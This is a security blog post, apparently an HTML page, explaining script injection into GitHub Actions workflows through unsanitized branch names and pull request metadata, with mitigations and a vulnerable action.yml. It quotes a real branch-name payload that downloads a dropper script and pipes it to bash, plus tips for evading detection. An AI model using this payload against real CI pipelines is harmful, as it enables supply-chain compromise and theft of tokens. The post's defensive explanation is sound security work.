<!DOCTYPE html>
<html lang="en" prefix="og:http://ogp.me/ns#">
	<head>
		<title>Malware Insights: GitHub Actions Script Injection - Cookie Engineer's Web Log</title>

		<!-- Meta -->
		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="creator" content="Cookie Engineer">
		<meta name="description" content="Malware Insights: GitHub Actions Script Injection">
		<meta name="keywords" content="malware, tholian-conquer-type">
		<meta name="generator" content="Beer and VIM night coding sessions">
		<meta name="robots" content="index, follow">
		<link rel="alternate" type="application/rss+xml" href="../feed.xml">

		<!-- Social Meta -->
		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/avatar/cookiengineer.png">
		<meta property="og:title" content="Malware Insights: GitHub Actions Script Injection - Cookie Engineer's Web Log">
		<meta property="og:site_name" content="Cookie Engineer's Web Log">
		<meta property="og:description" content="How to infiltrate CI/CD runners because they don't sanitize arbitrary string inputs.">
		<meta property="og:type" content="article">
		<meta name="twitter:card" content="summary">
		<meta name="twitter:domain" content="cookie.engineer">
		<meta name="twitter:title" itemprop="name" content="Malware Insights: GitHub Actions Script Injection - Cookie Engineer's Web Log">
		<meta name="twitter:description" itemprop="description" content="How to infiltrate CI/CD runners because they don't sanitize arbitrary string inputs.">

		<!-- Website Design -->
		<link rel="stylesheet" href="/design/layout/index.css">
		<link rel="stylesheet" href="/weblog/design/index.css">

		<!-- Weblog Design -->
		<link rel="stylesheet" href="/weblog/design/layout/highlight.css">
		<link rel="stylesheet" href="/weblog/design/layout/article.css">
		<script src="/weblog/design/layout/highlight.js"></script>
		<script src="/weblog/design/layout/article.js" defer></script>

		<!-- Website Functionality -->
		<link rel="stylesheet" href="/design/menu/index.css">
		<script src="/design/menu/index.js" defer></script>

		<!-- Magic: Copy/Paste -->
		<link rel="stylesheet" href="/design/magic/index.css">
		<script src="/design/magic/index.js" defer></script>

	</head>
	<body>
		<header>
			<aside id="menu" class="visible">
				<a id="menu-button" href="#menu">Menu</a>
				<a class="icon-section" href="/index.html">About&nbsp;Me</a>
				<a class="icon-section" href="/projects.html">Projects</a>
				<a class="icon-section" href="/talks.html">Talks</a>
				<a class="icon-section" href="/contact.html">Contact</a>
				<a class="icon-section" href="/weblog/index.html">Web&nbsp;Log</a>
			</aside>
			<aside id="toc">
				<a class="section" href="#attack-vector">Attack Vector</a>
				<a class="section" href="#arbitrary-unsanitized-inputs">Arbitrary Unsanitized Inputs</a>
				<a class="section" href="#vulnerable-example">Vulnerable Example</a>
				<a class="section" href="#mitigation">Mitigation</a>
				<a class="section" href="#security-checklist">Security Checklist</a>
				<a class="section" href="#personal-notes">Personal Notes</a>
				<a class="section" href="#pentesting-advice">Pentesting Advice</a>
			</aside>
		</header>
		<section id="article" class="article">
			<h1>Malware Insights: GitHub Actions Script Injection</h1>
			<article>
				<section>
					<p>
						It's time to talk about how DevOps and CI/CD pipelines work in general, and how the lack of
						sanitization of arbitrary input data leads to a false sense of security practices.
					</p>
				</section>
				<section>
					<h2 id="attack-vector">Attack Vector</h2>
					<p>
						GitHub Actions allow to execute code inside an isolated sandbox, which means that they also
						allow the execution of arbitrary code (which is kind of the point behind it). The particular
						problem, however, is that GitHub / GitLab / etc runners also allow to use variables in their
						templates, which will be printed out to the shell that's executing an
						<code>echo $variable</code>
						command.
					</p>
					<p>
						In each line of the GitHub Actions Log there is a specific
						<code>echo $variable</code>
						command which prints
						out the set
						<code>inputs</code>
						that are defined for each workflow. This also influences the UI as the log
						output is parsed and then used to update the UI with the state update inside the log. This might
						also lead to a potential XSS vector in the GitHub frontend, but has been unused/unproven at this
						time.
					</p>
					<p>
						The first incident of this new type of attack vector has been discovered as
						<a class="icon-github" href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc" target="_blank">GHSA-7x29-qqmq-v6qc</a>
						,
						but I'm trying to describe the problem here and how potentially more context variables can be used
						for this type of infiltration.
					</p>
					<pre class="bash">
# Executed inside the GitHub runner
echo "github.event_name: pull_request_target"
# ...
echo "first_input_name: ${first_input_name}"
echo "second_input_name: ${second_input_name}"
# ...
					</pre>
				</section>
				<section>
					<h2 id="arbitrary-unsanitized-inputs">Arbitrary Unsanitized Inputs</h2>
					<p>
						This means, however, that every environment variable that's used inside an
						<code>action.yml</code>
						file can
						be potentially abused if the source for it contains arbitrary data that's not filtered to contain
						no special characters and no escape characters.
					</p>
					<p>
						In the recent example that happened to the
						<code>ultralytics/ultralytics</code>
						repository, the attacker used
						the following name as the pull request's branch name to execute their malware dropper. In order to
						avoid potential web app firewalls that block network traffic, the attacker already avoided using an
						<code>https://</code>
						prefix, and hosted the malicious script code on a
						<code>gist</code>
						on github to avoid detection.
					</p>
					<p>
						The pull request's branch name
						:
					</p>
					<p><code>openimbot:$({curl,-sSfL,raw.githubusercontent.com/username/hash_of_gist/dropper.sh}${IFS}|${IFS}bash)</code></p>
					<p>
						In order to reproduce it you can also use different escaping techniques that avoid a crappy detection
						mechanism, similar to SQL injection. For example,
						<code>";;$(curl,...)</code>
						or a backslash or backtick using
						execution command might also work, as well as an invoked execution via a third-party command like
						<code>perl</code>
						,
						<code>node</code>
						or another REPL that supports execution via a CLI parameter.
					</p>
					<p>
						In the first incident, however, the above
						<code>git branch</code>
						name led to the pull request action workflow
						being executed automatically, without any possibility to cancel it by concept, and lead to installing
						the malware via the downloaded and executed
						<code>dropper.sh</code>
						file that also had access to all other
						process environment variables including the
						<code>GITHUB_TOKEN</code>
						and other lateral movement possibilities.
					</p>
					<p>
						The dropper then patched the generated zip/wheel files of the published python package for later runs,
						and inserted the crypto miner in those packages, but that's an unimportant detail in this context.
					</p>
					<p>
						The problem is really that all environment variables and all variable inputs in CI/CD actions
						templates are potentially vulnerable to this, meaning that they need extra sanitization/validation
						steps or to be avoided at all cost.
					</p>
					<p>
						Potentially vulnerable pull request action context variables at this point
						:
					</p>
					<ul>
						<li><code>github.ref</code></li>
						<li><code>github.base_ref</code></li>
						<li><code>github.head_ref</code></li>
						<li><code>github.workflow</code></li>
						<li><code>github.event.pull_request.title</code></li>
						<li><code>github.event.pull_request.body</code></li>
						<li><code>github.event.pull_request.base.label</code></li>
						<li><code>github.event.pull_request.base.ref</code></li>
						<li><code>github.event.pull_request.base.full_name</code></li>
						<li><code>github.event.pull_request.base.name</code></li>
						<li><code>github.event.pull_request.base.owner.login</code></li>
						<li><code>github.event.pull_request.head.label</code></li>
						<li><code>github.event.pull_request.head.ref</code></li>
						<li><code>github.event.pull_request.head.full_name</code></li>
						<li><code>github.event.pull_request.head.name</code></li>
						<li><code>github.event.pull_request.head.owner.login</code></li>
					</ul>
					<p>
						As you can see, a lot of meta data is passed down in the
						<code>JSON</code>
						data that comes from arbitrary
						sources. You should therefore be really cautious about what kind of metadata you include in your
						<code>action.yml</code>
						file.
					</p>
				</section>
				<section>
					<h2 id="vulnerable-example">Vulnerable Example</h2>
					<p>
						This vulnerable example is an
						<code>action.yml</code>
						file, typically located inside the repository's
						<code>/.github</code>
						or
						<code>/.gitlab</code>
						folder.
					</p>
					<p>
						It demonstrates how both the attacker's repository
						<code>full_name</code>
						and
						<code>git branch name</code>
						can be used to
						execute shell code. The fact that the
						<code>head_ref</code>
						is wrapped inside an environment variable doesn't
						actually matter here and demonstrates the non-working mitigation that others have been wrongly
						recommending in the advisory.
					</p>
					<p>
						Note that the
						<code>actions/checkout</code>
						plugin itself also runs a shell command behind the scenes, and
						also doesn't sanitize arguments that are passed to the executed shell commands later. It's running
						the
						<code>git</code>
						command via the private
						<a class="icon-github" href="https://github.com/actions/checkout/blob/main/src/git-command-manager.ts" target="_blank">GitCommandManager.execGit</a>
						method in case you want to audit it.
					</p>
					<pre class="yaml">
name: Publish Docs

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:
    inputs:
      publish_docs:
        description: "Publish something to https://example.com"
        default: "true"
        type: boolean

jobs:
  Docs:
    if: github.repository == 'example/repository'
    runs-on: ubuntu-latest
    env:
      GITHUB_REF: ${{ github.pull_request.head_ref }}
    steps:
      - name: Git config
        run: |
          git config --global user.name "Example User"
          git config --global user.email "user@example.com"
      - name: Checkout Repository
        uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          token: ${{ secrets.GITHUB_TOKEN }}
          ref: ${{ env.GITHUB_REF }}
          fetch-depth: 0
      - name: Run something else
        run: echo "I was already pwned here"
					</pre>
				</section>
				<section>
					<h2 id="mitigation">Mitigation</h2>
					<p>
						The obvious mitigation is to check for unsanitized input variables and to not allow them to be used
						in your repository's
						<code>action.yml</code>
						file. There are ongoing efforts at this time to build validators
						that not only validate the schema of an
						<code>action.yml</code>
						file, but also check against whether or not the
						variables inside the template can be malformed and can lead to remote code executions.
					</p>
					<p>
						The tool that I would recommend even though it's still in development is
						<a class="icon-github" href="https://github.com/woodruffw/zizmor" target="_blank">Zizmor</a>
						as the author of it is very security conscious and uses a defensive programming style.
					</p>
					<p>
						There might be some other tools available that are more stable, but as far as I know these only
						validate against the schema, not against vulnerabilities or weaknesses.
					</p>
				</section>
				<section>
					<h2 id="security-checklist">Security Checklist</h2>
					<p>
						As this type of problem is a regular occuring one for future changes of the
						<code>action.yml</code>
						file, I would
						like to point out that this sort of weakness needs regular ongoing audits and checks to prevent an
						infiltration of the build pipeline environment.
					</p>
					<p>
						This is a supply chain attack with lateral movement capabilities, and should be treated with the
						highest risk assessment as it's able to influence pretty much everything end-to-end in regards to how
						your software is compiled, built, updated, published and distributed.
					</p>
					<p>
						It might be fixable with a
						<code>pre-receive</code>
						hook that's running on the server-side in case your
						organization uses a self-hosted GitHub Enterprise, GitLab, Gitea, or Gogs instance. But as of today
						there's no software available to check these sorts of issues before the potentially vulnerable blob,
						git branch name, git user name, git user email etc. lands on the git server.
					</p>
					<p>
						Also keep in mind that as
						<code>git refs</code>
						and
						<code>git blobs</code>
						are hashed, this might make it harder for your
						Forensics team to check for this sort of attack vector, because evidence trails can be easily
						obfuscated with
						<code>git gc</code>
						and by similar means that remove or modify the
						<code>blob</code>
						filesystem behind git.
					</p>
					<p>
						Everything that's already pushed and received by
						<code>git</code>
						is stored in its
						<code>.git/objects/<ref></code>
						folder
						and may contain potentially dropper scripts and malware, and currently there is no check in place to
						prevent this if your repository is public.
					</p>
					<p>
						Depending on your CI/CD configuration and actions workflow templates, the attacker then can just
						access the malware from the git blobs via
						<code>git show <ref>:<path></code>
						or similar and may not even need to
						download a malware, as it would appear in the pull request as an already deleted change or not at all
						if the diffing algorithm does not automatically rebase to the current pull request's
						<code>HEAD</code>
						.
					</p>
					<p>
						On every change of your GitHub/GitLab Actions
						:
					</p>
					<ul>
						<li>Don't run a Pull Request bot for untrusted members</li>
						<li>Specifically allowlist trusted members for Pull Request workflow runs</li>
						<li>Double-check all commits in reviews, run <code>git gc</code> on the pull request's <code>HEAD</code> to prevent abuse of hidden blobs</li>
						<li>Use only the minimum amount of metadata you need for the actions workflow to complete</li>
						<li>Check every environment variable for arbitrary sources</li>
						<li>Check every GitHub/GitLab actions context variable for arbitrary sources</li>
					</ul>
				</section>
				<section>
					<h2 id="personal-notes">Personal Notes</h2>
					<p>
						As this attack vector is quite new and didn't happen a lot in the past as a supply chain attack,
						there's potentially a lot more to investigate.
					</p>
					<p>
						As most alternatives to GitHub also include some form of CI/CD or actions automation, those software
						projects might also be affected. This means that there needs to be an audit for GitLab, Gitea, Gogs,
						and other alternatives to ensure that this type of arbitrary data input isn't executed inside a shell
						environment.
					</p>
					<p>
						Technically, this sort of problem is a new weakness that has to be checked against regularly by an
						organization's DevSecOps teams, as it's reoccuring on every pull request and blob/tree change in git.
					</p>
					<p>
						My personal recommendation would be to not execute a runner inside a shell environment, at all, but
						that's where the DevOps crowd would not agree with me as they sure do love their shell magic.
					</p>
					<p>
						If I would have the time, I probably would implement a runner based on
						<a class="icon-github" href="https://github.com/traefik/yaegi" target="_blank">yaegi</a>
						or another typesafe interpreter instead of executing commands in a shell. But that is a huge amount
						of work to do end-to-end, and might therefore not be feasible for most companies alone.
					</p>
				</section>
				<section>
					<h2 id="pentesting-advice">Pentesting Advice</h2>
					<p>
						As the described technique might not work in the future, I'd recommend to try out other shell escape
						techniques that either use third-party and preinstalled REPLs to execute inlined scripts or that use
						different types of encodings to escape those restricted shell environments.
					</p>
					<p>
						A good start is to read the following chapters of these books
						:
					</p>
					<ul>
						<li>PayloadsAllTheThings, Chapter <a class="icon-github" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md" target="_blank">Command Injection</a></li>
						<li>0xffsec Handbook, Chapter <a class="icon-website" href="https://0xffsec.com/handbook/shells/restricted-shells/" target="_blank">Restricted Shells</a></li>
					</ul>
				</section>
			</article>
		</section>
		<footer>
			<p class="print-not">Made with 💔 in Heidelberg, Germany. All rights (and jokes) reserved under European Law.</p>
			<p>&copy; Cookie Engineer (https://cookie.engineer). All rights reserved.</p>
		</footer>
	</body>
</html>
